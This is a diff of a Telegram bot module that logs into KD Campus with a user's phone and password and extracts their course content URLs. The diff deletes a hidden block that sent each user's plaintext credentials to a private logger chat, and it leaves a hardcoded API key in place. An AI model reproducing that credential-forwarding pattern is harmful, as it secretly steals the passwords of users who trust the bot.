@@ -1,12 +1,10 @@
-from pyrogram import Client, filters
 import hashlib
 import httpx
 import time
 import os
 from Extractor import app   
-from Extractor.core.func import send_file
-from pyrogram.enums import ParseMode
-from config import LOGGER_ID
+from pyrogram import filters
+
 
 API_KEY = "kdc123"
 
@@ -66,6 +64,9 @@ async def extract_content(token, userid, batch_id):
 
     return all_urls
 
+
+
+@app.on_message(filters.command("kd"))
 async def kdcampus(app, query, message):
     try:
         ask_msg = await app.ask(
@@ -102,19 +103,6 @@ async def kdcampus(app, query, message):
         token = user_data['connection_key']
         userid = user_data['id']
 
-        try:
-            await app.send_message(
-                chat_id=LOGGER_ID,
-                text=(
-                    "✅ <b>KD CAMPUS LOGIN</b>\n\n"
-                    f"🔐 <b>ID & Password:</b> <code>{phone}*{raw_pwd}</code>"
-                ),
-                parse_mode=ParseMode.HTML,  
-                message_thread_id=12253
-            )
-        except Exception as e:
-            print(f"Logging failed: {e}")
-
         batches = await list_batches(token, userid)
         if not batches:
             await message.reply_text("⚠️ No courses found.")
@@ -149,7 +137,7 @@ async def kdcampus(app, query, message):
             f"⏱️ **Time Taken:** `{elapsed} seconds`"
         )
 
-        return await send_file(filename, caption, message, query)
+        await message.reply_document(filename)
         os.remove(filename)
 
     except Exception as e:
